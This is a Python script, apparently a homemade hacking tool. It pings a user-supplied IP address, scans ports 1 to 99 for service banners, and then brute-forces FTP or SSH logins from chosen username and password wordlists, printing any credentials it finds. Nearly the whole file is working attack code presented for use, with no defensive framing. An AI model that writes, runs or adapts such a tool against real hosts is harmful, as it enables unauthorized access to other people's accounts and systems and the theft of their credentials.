import socket
import os
import tkinter as tk
from tkinter import filedialog
import ftplib
import paramiko
import time



ip = input('Enter Target IP address: ')
ports = range(1,100)
open_ports = []
service_list = []
host_check = os.popen('ping -n 2 {}'.format(ip))
global s


if 'timed out' in host_check.read():
    print("[-] This is an unknown host can't scan it..")
    exit()
else:
    print('[+] This host is up moving to scan\n')

for port in ports:
    try:

        s = socket.socket()
        s.connect((ip, port))

        banner = (s.recv(20480).decode())
        open_ports.append(port)

        service_list.append(banner)
        time.sleep(1)
        print("[+] Port {} is open running service: {} ".format(port, banner))
    except:
        pass
    finally:
        s.close()
time.sleep(2)
print("[-] Done scanning")
time.sleep(1)

if len(open_ports) == 0:
    print('\n[!] There is no open ports to attack')
    print('Bye Bye ...')
    exit()

print('\n[+] This is are all the open ports on the remote host:\n\t\t\t - {} \n\tand its all banner we could get service '
      '\n\t\t\t -{} '.
      format(str(open_ports).strip('[]'), str(service_list).strip('[]').replace('\\r\\n', '').strip("'").strip("'")))
time.sleep(1)
if 21 and 22 in open_ports:
    print('''\n[-] For now we can brute force only this two service ftp and ssh
it look like the remote host is running this services''')
    user = input('\ndo you want to attack (Y/N)? ').lower()
    if user == 'y':
        print('''Please select the service to brute force
1.FTP
2.SSH
        ''')
        user = int(input('Please select number '))
        if user == 1:
            root = tk.Tk()
            root.withdraw()
            print("[+] Chose a username file")
            path_to_user_list = filedialog.askopenfilename()

            print("[+] Chose a password file\n")
            path_to_password_list = filedialog.askopenfilename()

            password_file = open(path_to_password_list, "r")
            password_list = password_file.read()
            password = password_list.splitlines()

            user_name_file = open(path_to_user_list, "r")
            user = user_name_file.read()
            first_user = user.splitlines()


            def ftp_login(user_name, passwd):
                server = ftplib.FTP()
                server.connect(ip, port=21)
                server.login(user=user_name, passwd=passwd)
                server.close()


            print('Attacking FTP\n')
            for i in range(len(first_user)):
                for x in range(len(password)):
                    try:

                        print('[!] Trying user:{}, password:{}'.format(first_user[i], password[x]))
                        ftp_login(first_user[i], password[x])
                        print("\n***** FOUND *****")
                        print("[+] User name: {}\n[+] Password: {}\n".format(first_user[i], password[x]))
                    except:
                        print('Nope that is not the right one trying again\n')
        elif user == 2:
            root = tk.Tk()
            root.withdraw()
            print("[+] Chose a username file")
            path_to_user_list = filedialog.askopenfilename()

            print("[+] Chose a password file\n")
            path_to_password_list = filedialog.askopenfilename()

            password_file = open(path_to_password_list, "r")
            password_list = password_file.read()
            password = password_list.splitlines()

            user_name_file = open(path_to_user_list, "r")
            user = user_name_file.read()
            first_user = user.splitlines()


            def ssh_login(user_name, passwd):
                ssh = paramiko.SSHClient()
                ssh.load_system_host_keys()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname=ip, port=22, username=user_name, password=passwd)
                ssh.close()


            print('Attacking SSH\n')
            for i in range(len(first_user)):
                for x in range(len(password)):
                    try:
                        print('[!] Trying user name: {}, password: {}'.format(first_user[i], password[x]))
                        ssh_login(first_user[i], password[x])
                        print("\n***** FOUND *****")
                        print("[+] User name: {}\n[+] Password: {}\n".format(first_user[i], password[x]))
                    except:
                        print('Nope that is not the right one trying again\n')
else:
    print('Cant find ftp or ssh service soi cant help you for now sorry =( ')
